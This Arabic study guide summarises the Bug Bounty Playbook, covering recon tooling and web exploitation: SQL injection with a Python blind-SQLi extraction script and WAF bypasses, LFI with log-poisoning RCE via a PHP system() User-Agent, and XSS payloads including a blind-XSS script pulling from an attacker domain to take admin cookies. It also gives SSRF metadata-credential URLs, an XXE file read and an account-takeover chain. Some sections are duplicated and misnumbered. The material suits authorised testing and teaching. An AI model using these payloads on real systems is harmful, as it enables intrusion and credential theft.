1. مقدمة وهيكل الكتابين

كتاب **Bug Bounty Playbook** (بمجلديه الأول والثاني) يمثل أحد أبرز المراجع التقنية التطبيقية في مجتمع الأمن السيبراني. قام الكاتب **Alex Thomas (Ghostlulz)** بتقسيم العملية الأمنية إلى قسمين جوهريين:

  • المجلد الأول (Reconnaissance & Fingerprinting): يركز بشكل كامل على التجهيز والاستطلاع، وجمع أكبر قدر من المعلومات ورسم البنية الشبكية والخارجية للهدف.
  • المجلد الثاني (Exploitation Playbook): ينتقل إلى الجانب الهجومي الحقيقي واستغلال الثغرات وتحدي أنظمة جدار الحماية (WAF) للوصول إلى ثغرات بالغة الأثر مثل الحقن والتسريب والتحكم عن بعد بالخوادم.
أهمية دراسة المجلدين معاً: المجلد الأول يوفر لك الأهداف والمنافذ المنسية التي لا يفحصها أحد، بينما يمنحك المجلد الثاني التكتيكات البرمجية واليدوية لاستغلال تلك الأهداف وصناعة إثبات مفهوم قوي (PoC) يضمن لك الحصول على أعلى مكافأة مالية (Bounty).

2. تجهيز سيرفر الـ VPS وحمايته

أول قاعدة أمنية في الاستطلاع هي عدم تشغيل أدوات فحص ثقيلة من شبكتك المنزلية؛ فسرعة الرفع لديك محدودة كما أن مزودي الإنترنت قد يحظرون حسابك نتيجة رصد حركة فحص أمني مشبوهة. يوصي الكتاب باستئجار خادم افتراضي خاص (VPS) مثل Linode أو DigitalOcean أو AWS EC2.

أ. أوامر تأمين خادم الـ VPS الأساسية

بمجرد إنشاء السيرفر بنظام Ubuntu/Debian، يجب إغلاق المنافذ غير المستخدمة ومنع الدخول بكلمة المرور والاكتفاء بـ SSH Key:

# تحديث النظام بالكامل
sudo apt update && sudo apt upgrade -y

# إنشاء مستخدم جديد غير جذري (Non-root user)
adduser hunter
usermod -aG sudo hunter

# تكوين جدار الحماية UFW لإغلاق كافة المنافذ عدا الـ SSH
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 53/udp
sudo ufw enable

لمنع هجمات التخمين على منفذ الـ SSH، نقوم بتعديل الإعدادات في ملف /etc/ssh/sshd_config ومنع استيقان كلمات المرور:

PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin no

ثم أعد تشغيل الخدمة: sudo systemctl restart sshd.

3. إعداد النطاق والـ DNS لـ Out-Of-Band (OOB)

العديد من الثغرات في المواقع الحديثة تكون عمياء (Blind)، مثل Blind SSRF أو Blind XSS أو Blind XXE. لا يمكنك رؤية استجابة السيرفر مباشرة، بل يجب أن تجبر السيرفر المستهدف على إرسال طلب خارجي إلى خادم استماع تحت سيطرتك لتأكيد الثغرة.

أ. خطوات تكوين خادم الأسماء (Nameserver Setup)

  1. قم بشراء نطاق رخيص (مثل hunter-oob.com) من أي مسجل نطاقات (GoDaddy, Namecheap).
  2. في لوحة تحكم النطاق، قم بإنشاء سجلات Glue Records تشير إلى آي بي السيرفر الخاص بك:
    • ns1.hunter-oob.com تشير إلى IP خادم الـ VPS الخاص بك.
    • ns2.hunter-oob.com تشير إلى IP خادم الـ VPS الخاص بك.
  3. قم بتغيير خوادم الأسماء (Nameservers) الخاصة بالنطاق ليشير إلى خوادم الأسماء التي أنشأتها.

ب. إعداد أداة الاستماع السريعة (Interactsh)

يوصي الكتاب باستخدام مشروع interactsh التابع لفريق ProjectDiscovery لالتقاط الطلبات الراجعة بشكل مشفر وسهل:

# تنصيب خادم interactsh على الـ VPS الخاص بك
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest

# تشغيل الخادم والإنصات للطلبات
interactsh-server -domain hunter-oob.com -listen-ip 192.168.1.100

4. توسيع النطاق الأفقي والرأسي (Scope Expansion)

قبل فحص النطاقات الفرعية، يجب اكتشاف كامل الأصول التي تمتلكها الشركة المستهدفة لتوسيع مساحة الاختراق.

أ. التوسيع الأفقي ورقم الـ ASN والـ CIDR IP Ranges

البحث عن أرقام الأنظمة المستقلة (ASN) والشبكات (CIDR) التي تمتلكها المؤسسة:

# البحث عن أرقام ASN الخاصة بالنطاق عبر amass
amass intel -org example.com

# معرفة نطاق الآي بي (CIDR) الخاص برقم ASN المكتشف
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u
💻 محاكي مخرجات البحث عن شبكات الـ IPs التابعة للشركة • Live Simulation
[AS12345] Example Inc. CIDR Ranges Mapped: 192.168.1.0/24 104.244.42.0/24 208.80.154.0/22

ب. استخدام dorks محرك البحث جوجل (Google Dorking)

البحث عن الصفحات الحساسة المؤرشفة:

# البحث عن لوحات تحكم وملفات تكوين مستثنى منها الموقع الرئيسي
site:*.example.com -site:www.example.com inurl:login OR inurl:admin
site:*.example.com ext:txt OR ext:env OR ext:bak OR ext:sql OR ext:conf

5. الاستطلاع السلبي للنطاقات (Passive Subdomain Recon)

الاستطلاع السلبي هو جمع النطاقات الفرعية للهدف دون إرسال حزمة واحدة لخوادمه، مما يمنع جدران الحماية للهدف من رصد عنوان IP الخاص بك وحظره.

أ. الاستعلام من سجلات شفافية الشهادات (Certificate Transparency Logs)

عندما يصدر أي نطاق شهادة SSL/TLS، يتم تسجيلها في سجلات عامة. يمكن الاستعلام منها عبر قواعد بيانات مثل `crt.sh`:

# استخلاص النطاقات الفرعية من crt.sh
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt_subs.txt

ب. استخدام مجمعات البيانات السلبية (Passive Aggregators)

يوضح الكتاب كيفية دمج مفاتيح الـ APIs لأدوات الاستطلاع مثل (Shodan, Censys, SecurityTrails, Chaos) في ملف إعدادات `subfinder` للحصول على أفضل النتائج:

# تشغيل الفحص السلبي المدمج
subfinder -d example.com -all -recursive -o subfinder_subs.txt

6. الاستطلاع النشط والتخمين (Active Subdomain Recon)

بعد إنهاء الجمع السلبي، نلجأ للاستطلاع النشط عبر تخمين أسماء النطاقات باستخدام قواميس كلمات ضخمة ومحللات DNS سريعة.

أ. فحص وتهيئة محللات الـ DNS (Resolvers)

تخمين ملايين النطاقات يتطلب خوادم DNS عامة سريعة ولا تعطي إجابات خاطئة. نستخدم dnsvalidator للتحقق من سلامة المحللات وحفظ قائمة نظيفة:

# فحص وتوليد قائمة resolvers موثوقة ونظيفة
dnsvalidator -t list -r https://raw.githubusercontent.com/blechschmidt/massdns/master/lists/resolvers.txt --threads 20 -o trusted_resolvers.txt

ب. التخمين عالي السرعة بـ Massdns / Puredns

نقوم بخلط قائمة النطاقات الفرعية مع قاموس كلمات ضخم (مثل SecLists) وتخمينها نشطاً:

# تخمين النطاقات الفرعية نشطاً
puredns bruteforce wordlist.txt example.com -r trusted_resolvers.txt -o active_subs.txt

ج. توليد التبديلات الهيكلية (Subdomain Permutations)

العديد من السيرفرات الداخلية للمطورين تحمل أسماء تبديلية مثل `target-dev.com` أو `dev-target.com` أو `target-staging.com`. نستخدم `goaltdns` لصياغة تلك التركيبات وتخمينها:

# توليد تنويعات وتخمينها مباشرة
goaltdns -l active_subs.txt -w permutations_wordlist.txt -o generated_perms.txt
puredns resolve generated_perms.txt -r trusted_resolvers.txt -o resolved_perms.txt

7. فحص المنافذ بمقاييس ضخمة (Port Scanning at Scale)

عندما تمتلك آلاف النطاقات الفرعية للهدف، فإن فحصها جميعاً بـ Nmap مباشرة سيستغرق أياماً. يضع الكاتب منهجية الفحص السريع المزدوج.

أ. التصفية الأولية للويب (HTTP Probing)

فرز النطاقات التي تقدم مواقع ويب وتعمل بالفعل وحفظ العناوين النشطة مع حالة الاستجابة:

cat subs.txt | httpx -title -status-code -content-length -tech-detect -o web_targets.txt

10. ثغرات السيطرة على النطاقات الفرعية (Subdomain Takeover)

تعد ثغرة السيطرة على النطاقات الفرعية من أخطر ثغرات الاستطلاع والـ DNS، وتمنح المهاجم القدرة على انتحال هوية الموقع بالكامل وتثبيت ملفات خبيثة أو سرقة الكوكيز الخاصة بالنطاق الرئيسي.

أ. آلية حدوث الثغرة هندسياً (Visual Attack Flow)

ب. جدول البصمات والـ Signatures للخدمات السحابية المشهورة

استخدم حقل التصفية السريع لتصفية بصمات الخدمات السحابية ونوع سجلاتها للتنقيب الفعلي:

الخدمة السحابية نوع السجل (Type) البصمة / نص الخطأ (Signature) حالة السيطرة
GitHub Pages CNAME There is not a GitHub Pages site here متاح أمنياً (Yes)
AWS S3 Buckets CNAME / Alias The specified bucket does not exist متاح أمنياً (Yes)

Zendesk Support CNAME Help Center Closed / Page not found متاح أمنياً (Yes)

ج. الفحص التلقائي والأمن

يتم الفحص التلقائي بالاستعانة بأداة `subjack` وقائمة البصمات المحدثة:

subjack -w active_subs.txt -t 80 -o takeovers.txt -ssl -c fingerprints.json
قاعدة الأخلاقيات (Proof of Concept): عند تأكيد الثغرة والسيطرة على النطاق، لا تقم برفع أي محتوى خبيث أو سرقة بيانات. فقط ضع ملف HTML بسيطاً يحمل رسالة تفيد بوجود الثغرة مع شعار موقعك كدليل أمني لتقديمه للشركة.
ص المسارات باستخدام Ffuf

تخمين مجلدات الموقع مع تحديد الامتدادات الحساسة وعزل الاستجابات الكاذبة:

ffuf -w SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://example.com/FUZZ -mc 200,301,302,403 -e .php,.zip,.bak,.git,.env -t 40

ب. سحب وإعادة بناء مجلدات Git المكشوفة

إذا كشف الفحص وجود مسار https://example.com/.git/ مفتوحاً، فهذا يعني أنه يمكنك استعادة السورس كود للموقع كاملاً. نستخدم أداة git-dumper لسحبه وإعادة بنائه بالكامل محلياً:

# سحب مجلد git المفتوح
git-dumper https://example.com/.git/ local_repo/

# فحص تاريخ الالتزامات (Commits) للبحث عن كلمات مرور أو مفاتيح مسربة
cd local_repo
git log -p

9. الاستطلاع على منصة GitHub (GitHub Recon)

المطورون كثيراً ما يقومون برفع أكواد تحتوي على كلمات مرور قواعد بيانات أو مفاتيح API خاصة بشركاتهم في مستودعاتهم الشخصية على GitHub بالخطأ.

أ. البحث اليدوي المتقدم (GitHub Dorks)

البحث في خانة البحث في موقع GitHub عن الكلمات المفتاحية الحساسة المربوطة بنطاق الهدف:

"example.com" API_key
"example.com" password
"example.com" oauth_token
"example.com" JDBC_connection

ب. الفحص التلقائي للمستودعات بـ Gitleaks

كشف كلمات المرور والمفاتيح الحساسة في تاريخ المستودعات بشكل تلقائي:

gitleaks detect --source ./local_repo -v

10. ثغرات السيطرة على النطاقات الفرعية (Subdomain Takeover)

أحد الثغرات الشائعة والسهلة وذات الخطورة العالية التي تتيح لك السيطرة الكاملة على نطاق فرعي للشركة.

أ. كيف تحدث الثغرة بالتفصيل؟

1. تقوم الشركة بإنشاء سجل CNAME لنطاق فرعي مثل docs.target.com يشير إلى خدمة سحابية خارجية مثل targetdocs.gitbook.io. 2. لاحقاً، تقوم الشركة بحذف حسابها على Gitbook أو إزالة المستودع، ولكن المطور ينسى حذف سجل CNAME من لوحة تحكم الـ DNS الخاصة به. 3. يظل سجل الـ DNS نشطاً ويشير إلى موقع فارغ على Gitbook. 4. يقوم المهاجم بإنشاء حساب على Gitbook وحجز اسم targetdocs لصالحه. 5. الآن، أي مستخدم يزور docs.target.com سيشاهد محتوى صفحة المهاجم مباشرة!

ب. الفحص التلقائي والأمن

يتم الفحص التلقائي بالاستعانة بأداة `subjack` وقائمة البصمات المحدثة:

subjack -w active_subs.txt -t 80 -o takeovers.txt -ssl -c fingerprints.json
قاعدة الأخلاقيات (Proof of Concept): عند تأكيد الثغرة والسيطرة على النطاق، لا تقم برفع أي محتوى خبيث أو سرقة بيانات. فقط ضع ملف HTML بسيطاً يحمل رسالة تفيد بوجود الثغرة مع شعار موقعك كدليل أمني لتقديمه للشركة.

11. فحص واختراق الووردبريس وأنظمة الـ CMS

أنظمة إدارة المحتوى هي أهداف شائعة جداً، والخلل الأكبر يكمن في الإضافات الضعيفة (Vulnerable Plugins).

أ. فحص الووردبريس الاحترافي بـ WPScan

البحث عن الثغرات، تسريب المستخدمين، وفحص المكونات الإضافية الضعيفة:

# فحص شامل وصامت مع تدوير الـ User-Agent واستخدام مفتاح للثغرات
wpscan --url https://example.com --enumerate vp,vt,u --random-user-agent --api-token YOUR_WPSEC_TOKEN

ب. استغلال ثغرة XML-RPC pingback

تفعيل ملف xmlrpc.php للاتصال بخوادم أخرى بالنيابة عن السيرفر (SSRF مصغر)، أو تخمين كلمات المرور مجمعة في طلب واحد لتخطي حمايات الحظر (Brute-force bypass):

<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>pass1</value></param>
    <param><value>pass2</value></param>
  </params>
</methodCall>

12. ثغرات SQL Injection وتخطي WAF

الحقن بقاعدة البيانات يسمح بالسيطرة الكاملة وسحب البيانات الحساسة أو حتى الحصول على شل (Shell) في السيرفر.

أ. استغلال ثغرات Union-Based SQLi يدوياً

لتنفيذ حقن بنجاح، يجب أولاً تحديد عدد الأعمدة التي يستعلم عنها السيرفر لكي يتطابق طلب الـ UNION الخاص بنا:

# تخمين عدد الأعمدة
http://example.com/item.php?id=1 ORDER BY 1--
http://example.com/item.php?id=1 ORDER BY 5-- (إذا ظهر خطأ فالأعمدة أقل من 5)

# استدعاء البيانات وتحديد الأعمدة التي تعرض محتوى على الصفحة
http://example.com/item.php?id=-1 UNION SELECT 1,2,3,4--

ب. كتابة سكريبت بايثون لاستغلال الحقن الأعمى (Blind Time-Based SQLi)

عندما لا تظهر البيانات أمامنا، نكتب سكريبت بايثون يرسل طلبات شرطية زمنية ويفحص مدة الرد لتخمين الحروف بالتتابع:

import requests
import time

url = "http://example.com/item.php?id=1"
extracted_db_name = ""

for i in range(1, 15): # تخمين أول 15 حرف من اسم القاعدة
    for char in "abcdefghijklmnopqrstuvwxyz_0123456789":
        payload = f" AND IF(SUBSTRING(database(),{i},1)='{char}', SLEEP(5), 0)"
        start_time = time.time()
        r = requests.get(url + payload)
        if time.time() - start_time >= 5:
            extracted_db_name += char
            print(f"[+] Extracted: {extracted_db_name}")
            break

ج. تجاوز حمايات جدار الحماية (WAF Bypass)

يوضح الكتاب كيفية تخطي جدار الحماية ModSecurity أو Cloudflare WAF:

  • ترميز الأحرف بـ Hex: بدلاً من كتابة 'admin' اكتب 0x61646d696e.
  • حقن التعليقات داخل الكلمات المفتاحية: UN/**/ION SE/**/LECT.
  • التخطي بـ Tamper Scripts في sqlmap:
sqlmap -u "http://example.com/item.php?id=1" --tamper=space2comment,between,randomcase --dbms=mysql --random-agent -v 3

13. ثغرات LFI/RFI والوصول للـ RCE

تضمين الملفات الحساسة والتنقل داخل مجلدات خادم الويب.

أ. استخدام ممرات المسار المتقدمة وتخطي الفلاتر

قراءة ملفات السيرفر في أنظمة لينكس وويندوز وتخطي فلاتر التنقية:

# فلاتر وتجاوزات قراءة الملفات
http://example.com/view.php?file=../../../../etc/passwd
http://example.com/view.php?file=....//....//....//etc/passwd (تخطي فلتر استبدال ../ بـ فراغ)
http://example.com/view.php?file=%252e%252e%252f%252e%252e%252fetc/passwd (تخطي الفلتر بالترميز المزدوج)

ب. استخدام PHP Wrappers لقراءة السورس كود

إذا استدعيت ملف PHP مباشرة عبر LFI فسيتم تشغيله، لقراءته دون تشغيل نستخدم الـ convert filter:

http://example.com/view.php?file=php://filter/read=convert.base64-encode/resource=config.php

ج. الوصول للـ RCE عبر تسميم السجلات (Log Poisoning)

  1. أرسل طلب HTTP ملوث بكود PHP داخل ترويسة الـ User-Agent: 
    User-Agent: <?php system($_GET['cmd']); ?>
  2. سيقوم سيرفر أباتشي بحفظ الطلب بملف سجلات الوصول.
  3. قم باستدعاء ملف السجلات عبر ثغرة الـ LFI وشغّل الأوامر: 
    http://example.com/view.php?file=../../../../var/log/apache2/access.log&cmd=id

14. ثغرات XSS (DOM & Blind) وتجاوز WAF

حقن نصوص برمجية لتنفيذها في متصفحات المستخدمين الآخرين.

أ. ثغرات DOM-based XSS

تحدث بالكامل في جهة العميل (Client-Side). يجب تحليل كود جافا سكريبت للبحث عن المصادر (Sources) والمصبات (Sinks):

  • المصادر (Sources): location.search, location.hash, document.referrer
  • المصبات (Sinks): innerHTML, eval(), document.write()

ب. ثغرات الـ XSS العمياء (Blind XSS)

حقن بايلود في أماكن لا تراها أنت (مثل لوحة تحكم الدعم الفني، نموذج الشكاوى). يوصي الكاتب باستخدام منصة استقبال متطورة ترسل لك تنبيهاً فورياً عند تشغيل الكود في متصفح الأدمن مع سحب الكوكيز وصورة لصفحة الأدمن:

<script src="https://hunter-oob.com/log.js"></script>

ج. تجاوز حمايات الـ XSS Filters و WAF

تجاوز فلاتر منع وسوم الـ script التقليدية:

# بايلودات تخطي باستخدام وسم الصورة والـ SVG
<img src=x onerror=alert(1)>
<svg onload=alert(document.domain)>
<iframe src=javascript:alert(1)>

15. ثغرات CSRF وكيفية تخطي الـ Tokens

إجبار متصفح المستخدم على تنفيذ إجراءات ضارة دون علمه.

تكتيكات تخطي الـ Anti-CSRF Tokens

  • تغيير طريقة الطلب (Method Swap): تحويل طلب POST إلى GET لعل المطور يتحقق من التوكن فقط في طلبات POST.
  • إزالة معامل الـ Token بالكامل: في بعض الأحيان، إذا قمت بحذف ترويسة التوكن أو المعامل من الطلب، فإن التطبيق يتخطى التحقق تماماً بدلاً من حظره.
  • استخدم توكن مستخدم آخر: للتحقق هل يقوم السيرفر بربط التوكن بالجلسة الحالية أم أنه يقبل أي توكن صحيح لجلية أخرى.

16. ثغرات SSRF وتجاوز الفلاتر المحلية

إجبار خادم الويب على الاتصال بالأنظمة الداخلية وسحب الـ Cloud Metadata.

أ. استغلال الـ Cloud Metadata في بيئات السحاب

# AWS Metadata Endpoint (IAM Keys & Roles)
http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name

# Google Cloud Platform (GCP) Metadata (يتطلب ترويسة مخصصة ولكن يسهل الفحص)
http://metadata.google.internal/computeMetadata/v1/

ب. تجاوز فلاتر الحظر المحلية (Blacklist Bypass)

تجاوز منع الكلمات والـ IPs المحلية (مثل حظر 127.0.0.1) عبر:

# تحويل الـ IP إلى عشري أو ثماني أو هيكس
http://2130706433 (Decimal لـ 127.0.0.1)
http://0177.0.0.1 (Octal لـ 127.0.0.1)
http://0x7f000001 (Hex لـ 127.0.0.1)

# استخدام خدمات DNS للتوجيه المحلي
http://spoof.127.0.0.1.nip.io

17. ثغرات XML External Entity (XXE)

استغلال ملفات XML لقراءة ملفات السيرفر أو عمل مسح للشبكة الداخلية.

أ. استغلال ثغرات XXE لقراءة الملفات

حقن الكيانات الخارجية داخل الطلب الموجه للسيرفر:

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

18. ثغرات التحكم بالوصول IDOR

التلاعب بالمعرفات الحساسة للوصول لبيانات مستخدمين آخرين دون قيود أو صلاحيات صحيحة.

تكتيكات كشف ثغرات الـ IDOR

  • تغيير معرف المستخدم (ID Tampering): تلاعب بالـ parameters في الطلب: /api/user/101 بدلاً من /api/user/100.
  • تغيير نوع الطلب (HTTP Method Swapping): محاولة تغيير نوع الطلب من GET (للقراءة فقط) إلى POST أو PUT أو DELETE لعمل تعديل أو حذف لبيانات مستخدم آخر.
  • تجاوز معرفات الـ UUID: إذا كان التطبيق يستخدم معرفات عشوائية صعبة التخمين (UUID)، ابحث عن واجهات برمجية أخرى في التطبيق (مثل APIs البحث أو ملفات التعريف العامة) التي قد تسرب الـ UUID الخاص بالضحية، ثم استخدمه في الطلب المصاب بالـ IDOR.

19. دمج الثغرات (Vulnerability Chaining)

تحويل الثغرات البسيطة لضربة قاضية أمنية لزيادة قيمة المكافأة المالية.

أ. دمج الثغرات (Vulnerability Chaining)

لا تتوقف عند إثبات وجود ثغرة بسيطة؛ فكر كيف يمكن استغلالها للوصول لثغرة أكبر. أمثلة للدمج الناجح:

  • CSRF + Stored XSS: استغلال ثغرة CSRF لحقن كود XSS مخزن داخل إعدادات بروفايل الضحية، مما يضمن تشغيل الكود بمجرد فتح البروفايل دون تدخل منه.
  • LFI + SSRF: استغلال ثغرة LFI لقراءة ملفات التكوين والوصول لمفاتيح الاستيقان (Tokens)، ثم استخدامها مع ثغرة SSRF للاتصال والسيطرة على الخدمات الداخلية للسيرفر.

20. صياغة التقارير الأمنية الحيوية

أنت لست مجرد هكر يبحث عن ثغرة، بل أنت تقدم استشارة أمنية للشركة. تقريرك هو المنتج النهائي الذي يحدد المكافأة المالية.

أ. هيكل التقرير الاحترافي

  • العنوان (Title): مباشر ويحدد الثغرة والمكان بدقة.
  • الوصف (Description): شرح منطقي ومبسط للثغرة.
  • خطوات إعادة الإنتاج (Steps to Reproduce): خطوات مرقمة واضحة ومختصرة يمكن لأي مطور تنفيذها للتأكد.
  • الأثر الأمني (Impact): ماذا يستفيد المخترق الحقيقي؟ (تخطي الصلاحيات، سرقة الحسابات).
  • إثبات المفهوم (PoC): صور واضحة أو رابط فيديو قصير يوضح المشكلة.

💡 نصائح وتوجيهات الكاتب الميدانية (Playbook Golden Advice)

جمعنا لك هنا زبدة الخبرة العملية والنصائح الذهبية التي يركز عليها الكاتب في فصول كتابه للتنقيب والعمل الميداني الفعلي:

22. بنك الأسئلة والاختبارات التفاعلية

🧪 بنك أسئلة مراجعة موسوعة Bug Bounty Playbook (انقر لعرض الإجابة النموذجية)
الإجابة النموذجية: ينصح الكتاب بتجنب الفحص العدواني المباشر (-A or -T5). بدلاً من ذلك، استخدم الفحص المتخفي (-sS)، وحدد وتيرة إرسال منخفضة (-T2 or -T3)، وقم بتغيير المنفذ المصدري للطلبات لجعلها تبدو كحركة مرور عادية (مثل استخدام المنفذ 53 أو 80 أو 443 عبر خيار --source-port)، وقم بتدوير عناوين الـ IP إن أمكن.
الإجابة النموذجية: لأن المهاجم يستطيع استضافة صفحة تصيد متكاملة لبيانات المستخدمين أو رفع ملفات خبيثة وتنزيلها تلقائياً على متصفح الزوار تحت اسم النطاق الرسمي والموثوق للشركة (مثل `login.target.com`). هذا يسهل سرقة كوكيز المستخدمين لأن متصفحاتهم سترسلها تلقائياً بسبب سياسة المصدر نفسه (Same-Origin Policy).
الإجابة النموذجية: نقوم بحقن دالة شرطية زمنية (مثل `AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)`). إذا تأخر رد السيرفر لمدة 5 ثوانٍ، فهذا يؤكد أن الحرف الأول من اسم قاعدة البيانات هو 'a'. نقوم بتكرار العملية لتخمين الحروف بالتتابع يدوياً أو كتابة سكريبت بايثون بسيط لأتمتة العملية.
الإجابة النموذجية: نرسل طلب HTTP ملوثاً بكود PHP خبيث في حقل الـ User-Agent (مثل `<?php system($_GET['cmd']); ?>`). سيقوم السيرفر بحفظ هذا الطلب في ملف سجلات الوصول `access.log`. بعد ذلك نقوم باستدعاء ملف السجلات هذا عبر ثغرة الـ LFI مع تمرير الأمر المطلوب تشغيله في الـ parameter (مثل `&cmd=id`)، ليقوم مفسر PHP بتشغيل البايلود وعرض النتائج.
الإجابة النموذجية: هو هجوم يجبر متصفح الضحية على إرسال طلبات حساسة ومصرحة لموقع ما مستغلاً وجود كوكيز الجلسة نشطة. تتم الحماية الفعالة عبر تطبيق حمايات الـ **Anti-CSRF Tokens** الفريدة والصالحة لمرة واحدة وربطها بالجلسة، بالإضافة إلى تفعيل ميزة **SameSite Cookie Attribute** وضبطها على قيمة `Lax` أو `Strict` لمنع إرسال الكوكيز مع الطلبات الواردة من مواقع خارجية.
الإجابة النموذجية: المهاجم يملك خادم DNS ونطاقاً خاصاً. عندما يقوم السيرفر المستهدف بعمل Resolve للنطاق للتحقق من أمان الـ IP، يعود خادم الـ DNS الخاص بنا بـ IP عام مسموح به (بـ TTL=0). بمجرد قبول الفحص، يرسل السيرفر الطلب الفعلي، فيقوم المتصفح أو السيرفر بعمل Resolve مجدداً للنطاق، وهنا يعود خادم الـ DNS بـ IP محلي (127.0.0.1)، فيتصل السيرفر بنفسه داخلياً ويتم استغلال الـ SSRF.
الإجابة النموذجية: واجهات الـ APIs كثيراً ما تعتمد على معرفات مرقمة أو صريحة في الـ URL أو في الـ Request Body (مثل `/api/v1/billing/1005`). إذا لم يقم المطور بإجراء عمليات تحقق خلفية صارمة تتأكد من أن المستخدم صاحب الجلسة يملك حق الصلاحية والوصول الفعلي للسجل رقم `1005` بالذات، فسيتمكن أي مستخدم آخر من سحب وتعديل فواتير وبيانات الآخرين بمجرد تلاعب رقمي بالطلب.
الإجابة النموذجية: ثغرة Drupalgeddon 2 (CVE-2018-7600) تحدث بسبب معالجة غير آمنة للمدخلات في الـ Render Arrays الخاصة بـ Drupal 7 & 8. يسمح هذا للمهاجم بإرسال طلب HTTP يحتوي على بايلود يبدأ بعلامة الـ hash `#` (مثل `#post_render` أو `#markup`) مع دالة نظام (مثل `exec` or `passthru`) لتشغيل أوامر مباشرة على خادم الويب بدون استيقان.
الإجابة النموذجية: نستخدم الأمر gitleaks detect --source . -v داخل مجلد المشروع. تقوم الأداة بعمل مسح شامل لجميع التغييرات والالتزامات التاريخية (Commits) في مستودع Git، مستعينة بقواعد مطابقة تكتشف بصمات المفاتيح وكلمات المرور الشائعة (Regex Patterns) وتنبيهك فوراً برقم السطر والملف المصاب قبل رفعه للـ Public Github.
الإجابة النموذجية: نبحث عن endpoint لتعديل الإيميل يكون مصاباً بـ IDOR (يقبل تلاعب الـ ID لتغيير إيميل مستخدم آخر) وبنفس الوقت لا يستخدم Anti-CSRF Token. نقوم ببناء كود HTML يقوم بإرسال طلب POST تلقائي مستهدفاً الـ ID الخاص بحساب الأدمن وتغيير إيميله إلى إيميل المهاجم، ونقوم بإرسال الرابط للأدمن. بمجرد نقره للرابط، يتم تغيير إيميله تلقائياً ونسحب السيطرة على حسابه بالكامل.
